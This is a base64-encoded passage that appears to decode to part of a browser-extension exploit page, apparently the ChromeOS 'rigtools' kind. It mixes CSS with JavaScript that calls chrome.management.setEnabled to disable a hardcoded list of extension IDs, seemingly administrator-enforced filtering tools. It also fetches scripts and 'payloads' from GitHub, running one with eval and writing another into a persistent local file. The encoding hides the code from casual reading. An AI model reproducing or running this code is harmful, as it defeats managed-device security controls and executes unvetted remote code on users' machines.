QtaXRlbSBzcGFuOmhvdmVyIHsKICBvdmVyZmxvdzogdmlzaWJsZTsKICB3aGl0ZS1zcGFjZTogbm9ybWFsOwogIGhlaWdodDogYXV0bzsKfQoKYnV0dG9uIHsKICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OwogICAgY29sb3I6ICM5ZGJhZTk7CiAgICBmb250LXdlaWdodDogYm9sZDsKICAgIGJvcmRlcjogMXB4IHNvbGlkICMwNDdkYjc7CiAgICBib3JkZXItcmFkaXVzOiAyMHB4OwogICAgaGVpZ2h0OiAzNXB4OwogICAgcGFkZGluZzogN3B4IDEwcHg7CiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICBhbGlnbi1zZWxmOiBmbGV4LWVuZDsKICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQgMC4ycyBlYXNlLWluLW91dDsKICAgIG91dGxpbmU6IG5vbmU7Cn0KCmJ1dHRvbjpob3ZlciB7CiAgICBiYWNrZ3JvdW5kOiAjMzgzOTNiOwp9CgppbnB1dCB7CiAgcGFkZGluZzogOHB4IDE2cHg7CiAgbWFyZ2luOiA0cHggMnB4OwogIGNvbG9yOiB3aGl0ZTsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMGEwYTBhOwogIGJvcmRlcjogMXB4IHNvbGlkICMzMzM7Cn0KCmlucHV0OmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTExOwogIGJvcmRlci1jb2xvcjogI2ZmZjsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b24gewogIHBvc2l0aW9uOiByZWxhdGl2ZTsKICBkaXNwbGF5OiBpbmxpbmUtZmxleDsKICBhbGlnbi1pdGVtczogY2VudGVyOwogIGp1c3RpZnktY29udGVudDogZmxleC1zdGFydDsKICBwYWRkaW5nOiA5cHggMTVweCA5cHggNjBweDsKICBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsKICBjb2xvcjogYmxhY2s7CiAgYm9yZGVyLXJhZGl1czogNnB4OwogIG1hcmdpbjogNHB4IDJweDsKICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MsIGNvbG9yIDAuM3M7Cn0KCiN0b2dnbGVhYmxlLWJ1dHRvbnMgYnV0dG9uOmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTJlMmUyOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvbjo6YmVmb3JlIHsKICBjb250ZW50OiAnJzsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgbGVmdDogMTJweDsKICB0b3A6IDUwJTsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSk7CiAgd2lkdGg6IDQycHg7CiAgaGVpZ2h0OiAyMnB4OwogIGJhY2tncm91bmQtY29sb3I6ICMzMzM7CiAgYm9yZGVyLXJhZGl1czogMTJweDsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b246OmFmdGVyIHsKICBjb250ZW50OiAnJzsKICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgbGVmdDogMTRweDsKICB0b3A6IDUwJTsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSk7CiAgd2lkdGg6IDE4cHg7CiAgaGVpZ2h0OiAxOHB4OwogIGJhY2tncm91bmQtY29sb3I6ICNmZmY7CiAgYm9yZGVyLXJhZGl1czogNTAlOwp9CgojdG9nZ2xlYWJsZS1idXR0b25zIGJ1dHRvblt0b2dnbGVkPSJ0cnVlIl06OmJlZm9yZSB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKfQoKI3RvZ2dsZWFibGUtYnV0dG9ucyBidXR0b25bdG9nZ2xlZD0idHJ1ZSJdOjphZnRlciB7CiAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC01MCUpIHRyYW5zbGF0ZVgoMjBweCk7Cn0KCi5jb250YWluZXIgewogIGRpc3BsYXk6IGZsZXg7CiAgZ2FwOiAxMHB4Owp9CgojY29kZS1ydW4gewogIGJhY2tncm91bmQtY29sb3I6ICNmZmY7CiAgY29sb3I6IGJsYWNrOwogIGJvcmRlcjogbm9uZTsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgcGFkZGluZzogOHB4IDE2cHg7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgY3Vyc29yOiBwb2ludGVyOwp9CgojY29kZS1ydW46aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7Cn0KCiNjb2RlIHsKICBiYWNrZ3JvdW5kOiAjMDAwOwogIGNvbG9yOiB3aGl0ZTsKICB3aWR0aDogMTAwJTsKICBtaW4taGVpZ2h0OiA1MHB4OwogIGhlaWdodDogMjAwcHg7CiAgcmVzaXplOiBib3RoOwogIGJvcmRlcjogMXB4IHNvbGlkICM0QjRCNEQ7CiAgYm9yZGVyLXJhZGl1czogNXB4OwogIGZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CiAgcGFkZGluZzogOHB4OwogIGJveC1zaXppbmc6IGJvcmRlci1ib3g7Cn0KCiNjb2RlOmZvY3VzIHsKICBib3JkZXItY29sb3I6ICNmZmY7Cn0KCi50b2FzdFtwb3BvdmVyXTpwb3BvdmVyLW9wZW4gewogIG9wYWNpdHk6IDE7CiAgdG9wOiA1cHg7CiAgbGVmdDogNTAlOwp9CgpAc3RhcnRpbmctc3R5bGUgewogIC50b2FzdFtwb3BvdmVyXTpwb3BvdmVyLW9wZW4gewogICAgb3BhY2l0eTogMDsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtMTAwJSk7CiAgfQp9CgoudG9hc3RbcG9wb3Zlcl0gewogIHBvc2l0aW9uOiBmaXhlZDsKICBpbnNldDogdW5zZXQ7CiAgcGFkZGluZzogNXB4IDEwcHg7CiAgYm9yZGVyLXJhZGl1czogNXB4OwogIG9wYWNpdHk6IDA7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgYmFja2dyb3VuZDogIzBhMGEwYTsKICBjb2xvcjogd2hpdGU7CiAgYm9yZGVyOiAxcHggc29saWQgIzQ0NDsKfQoKZGlhbG9nIHsKICBvcGFjaXR5OiAwOwogIHBhZGRpbmc6IDMwcHg7CiAgYm9yZGVyOiAxcHggc29saWQgIzJkMmQyZDsKICBiYWNrZ3JvdW5kOiAjMDAwOwogIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgjMzMzIDFweCwgdHJhbnNwYXJlbnQgMXB4KTsKICBiYWNrZ3JvdW5kLXNpemU6IDJyZW0gMnJlbTsKICBib3JkZXItcmFkaXVzOiAxMHB4OwogIHRyYW5zaXRpb246IGFsbCAwLjVzOwogIG1pbi13aWR0aDogNTB2dzsKICBtaW4taGVpZ2h0OiA2MHZoOwogIG1heC13aWR0aDogNTB2dzsKICBtYXgtaGVpZ2h0OiA2MHZoOwogIGRpc3BsYXk6IGZsZXg7CiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKfQoKZGlhbG9nW29wZW5dIHsKICBvcGFjaXR5OiAxOwogIHRyYW5zZm9ybTogc2NhbGUoMSk7Cn0KCmRpYWxvZzo6YmFja2Ryb3AgewogIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC4yNSk7CiAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDNweCk7Cn0KCmRpYWxvZyBkaXYgewogIGJhY2tncm91bmQtY29sb3I6ICMwMDA7CiAgZm9udC1mYW1pbHk6ICdHZWlzdCcsIHNhbnMtc2VyaWY7Cn0KCmRpYWxvZyBwIHsKICBtYXJnaW4tYm90dG9tOiA5cHg7CiAgcGFkZGluZzogOXB4OwogIGJvcmRlcjogMXB4IHNvbGlkICMyNzI3MmE7CiAgZm9udC13ZWlnaHQ6IDcwMDsKfQoKZGlhbG9nIGgxIHsKICBmb250LXNpemU6IDEuNXJlbTsKICBjb2xvcjogd2hpdGU7CiAgZm9udC13ZWlnaHQ6IDkwMDsKfQoKd2hpdGVidXR0b25zIGJ1dHRvbiB7CiAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7CiAgYm9yZGVyOiAycHggc29saWQgcmdiKDE2OCwgMTk5LCAyNTApOwogIGNvbG9yOiByZ2IoNCwgMTI1LCAxODMpOwp9Cgp3aGl0ZWJ1dHRvbnMgYnV0dG9uOmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDE2OCwgMTk5LCAyNTAsIDAuMSk7CiAgY29sb3I6IHJnYigxNjgsIDE5OSwgMjUwKTsKfQoKbGl0c3R1ZmYgewogIGNvbG9yOiAjNDQ0OwogIGZvbnQtZmFtaWx5OiBtb25vc3BhY2UsIHNhbnMtc2VyaWY7CiAgZm9udC1zaXplOiAxMnB4OwogIGZvbnQtc3R5bGU6IGl0YWxpYzsKICBtYXJnaW4tbGVmdDogNnB4Owp9CiAgICA8L3N0eWxlPgogIGA7CgpvbmxvYWQgPSBhc3luYyBmdW5jdGlvbiB4KCkgewogICAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgICBkb2N1bWVudC5vcGVuKCk7CiAgICB0aGlzLmRvY3VtZW50LndyaXRlKGh0bWxTdHlsZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwoKICAgIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgICAgICAgY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCJkYXRhOnRleHQvaHRtbCw8aDE+SGVsbG88L2gxPiIpOwogICAgICAgIGRvY3VtZW50LndyaXRlKGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNidG5fRk1QX29wZW5VUkwiKS5vbmNsaWNrID0gZnVuY3Rpb24oZXYpIHt9OwogICAgfQoKICAgIGlmIChjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImJlZm9yZWVuZCIsIG1hbmFnZW1lbnRUZW1wbGF0ZSk7CiAgICAgICAgY29uc3QgZXh0bGlzdF9lbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLmV4dGxpc3QiKTsKCiAgICAgICAgYXdhaXQgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgY29uc3QgY29udGFpbmVyX2V4dGVuc2lvbnMgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoCiAgICAgICAgICAgICIjY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiCiAgICAgICAgKTsKCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI2N1cnJlbnQtZXh0ZW5zaW9uIikub25jbGljayA9CiAgICAgICAgICAgIGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZ3JhYmlkdG9raWxsID0gY2hyb21lLnJ1bnRpbWUuaWQ7CiAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChncmFiaWR0b2tpbGwsIGZhbHNlKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIGFsZXJ0KCJ1bnN1Y2Nlc3NmdWwiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3Jtdi1jbW4tYmx0Iikub25jbGljayA9IGZ1bmN0aW9uIGRmKCkgewogICAgICAgICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAgICAgICAgICJjZ2JiYmptZ2RwbmlmaWpjb25oYW1nZ2plaGxhbWNpZiIsCiAgICAgICAgICAgICAgICAibGZrYmJtY2xucGFpaHBhYWpob2hoZmRqZWxjaGtpa2YiLAogICAgICAgICAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAgICAgICAgICJwb2htZ29iZGVhamVtY2lmcG9sZG5uaGZmam5ua2hnZiIsCiAgICAgICAgICAgICAgICAiYmVjZHBsZmFsb29mbGFuaXBqb2JsY21wYWVra2JiaGUiLAogICAgICAgICAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAgICAgICAgICJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIsCiAgICAgICAgICAgICAgICAiaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiLAogICAgICAgICAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAgICAgICAgICJra2JtZGdqZ2djZGFqY2tkbGJuZ2Rqb25wY2hwYWllYSIsCiAgICAgICAgICAgICAgICAibmpkbmljbGdlZ2lqZGNkbGlrbGdpZWljYW5wbWNuZ2oiLAogICAgICAgICAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiwKICAgICAgICAgICAgXTsKCiAgICAgICAgICAgIGxldCBleHRzID0ge307CiAgICAgICAgICAgIGxldCBleHRsbmd0aCA9IDA7CgogICAgICAgICAgICBmdW5jdGlvbiBnZXRMZW5ndGgoKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCwgaSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb25FeGlzdHMoaWQpLnRoZW4oKHJlcykgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlcykgZXh0bG5ndGgrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChibG9hdElkcy5sZW5ndGggLSAxID09PSBpKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGluaXRFeHRPYmooKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICBibG9hdElkcy5mb3JFYWNoKChpZCkgPT4KICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihleHRzLCBKU09OLnBhcnNlKGB7IiR7ZS5pZH0iOiIke2Uuc2hvcnROYW1lfSJ9YCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBleHRsbmd0aCkgcmVzb2x2ZSgpOwogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZ2V0TGVuZ3RoKCkudGhlbigoKSA9PgogICAgICAgICAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4KICAgICAgICAgICAgICAgICAgICBtYWtlRGlhbG9nKAogICAgICAgICAgICAgICAgICAgICAgICAiQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRpc2FibGUgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zPyIsCiAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC52YWx1ZXMoZXh0cyksCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkge30sCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpc2FibGVkRXh0cyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmtleXMoZXh0cykuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpZCA9PSBjaHJvbWUucnVudGltZS5pZCkgcmV0dXJuOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5wdXNoKGUuc2hvcnROYW1lKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGlzYWJsZWQgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zOlxyXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5qb2luKCJcclxuIiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDI1MCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICk7CiAgICAgICAgfTsKCiAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT0gSlNPTi5zdHJpbmdpZnkoW10pKSB7CiAgICAgICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zCiAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IG5vbmU7Iik7CiAgICAgICAgfQoKICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKS5vbmNsaWNrID0KICAgICAgICAgICAgZnVuY3Rpb24gZGYoZSkgewogICAgICAgICAgICAgICAgbGV0IGV4dHMgPSB7fTsKCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBpbml0RXh0T2JqKCkgewogICAgICAgICAgICAgICAgICAgIGxldCBpZGxpc3QgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpZGxpc3QuZm9yRWFjaCgoaWQpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGV4dHMsIEpTT04ucGFyc2UoYHsiJHtlLmlkfSI6IiR7ZS5zaG9ydE5hbWV9In1gKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBpZGxpc3QubGVuZ3RoKSByZXNvbHZlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4gewogICAgICAgICAgICAgICAgICAgIG1ha2VEaWFsb2coCiAgICAgICAgICAgICAgICAgICAgICAgICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGlzYWJsZSB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM/IiwKICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhleHRzKSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzYWJsZWRFeHRzID0gW107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZS5lbmFibGVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMucHVzaChlLnNob3J0TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGlkLCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZGlzYWJsZWRFeHRzLmxlbmd0aCA8IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRpc2FibGVkIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9uczpcclxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMuam9pbigiXHJcbiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAyNTApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9OwogICAgfQogICAgY29uc3Qgb3RoZXJGZWF0dXJlcyA9IHdpbmRvdy5jaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpOwogICAgY29uc3QgcGVybWlzc2lvbnMgPSBvdGhlckZlYXR1cmVzLnBlcm1pc3Npb25zOwoKICAgIG5ldyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzKCkuYWN0aXZhdGUoKTsKICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKAogICAgICAgICJiZWZvcmVlbmQiLAogICAgICAgIGAKICAgICAgPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KICAgICAgPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi8iPgogICAgICBgCiAgICApOwoKICAgIGNvbnN0IFNjcmlwdEJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjb3RoZXItYnV0dG9ucyIpOwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3N3YW1wIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICBmZXRjaCgKICAgICAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHRzL3N3YW1wLXVsdHJhLmpzIgogICAgICAgICAgICApCiAgICAgICAgICAgIC50aGVuKChyZXMpID0+IHJlcy50ZXh0KCkpCiAgICAgICAgICAgIC50aGVuKGV2YWwpOwogICAgfTsKCiAgICBTY3JpcHRCdXR0b25zLnF1ZXJ5U2VsZWN0b3IoIiN1cGRhdGUiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIChhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGZzID0gYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSkgewogICAgICAgICAgICAgICAgd2Via2l0UmVxdWVzdEZpbGVTeXN0ZW0oUEVSU0lTVEVOVCwgMiAqIDEwMjQgKiAxMDI0LCByZXNvbHZlKTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGU6IHRydWUKICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24od3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3QgdXJsID0gYXdhaXQgd3JpdGVGaWxlKAogICAgICAgICAgICAgICAgImhhcnRvb2xzLmh0bWwiLAogICAgICAgICAgICAgICAgYCR7YXdhaXQgZmV0Y2goCiAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL3BheWxvYWRzL2luZGV4Lmh0bWwiCiAgICAgICAgKS50aGVuKChyZXMpID0+IHJlcy50ZXh0KCkpfTxzY3JpcHQgc3JjPSIuL2hhcnRvb2xzLmpzIj48L3NjcmlwdD5gCiAgICAgICAgICAgICk7CgogICAgICAgICAgICBhd2FpdCB3cml0ZUZpbGUoCiAgICAgICAgIC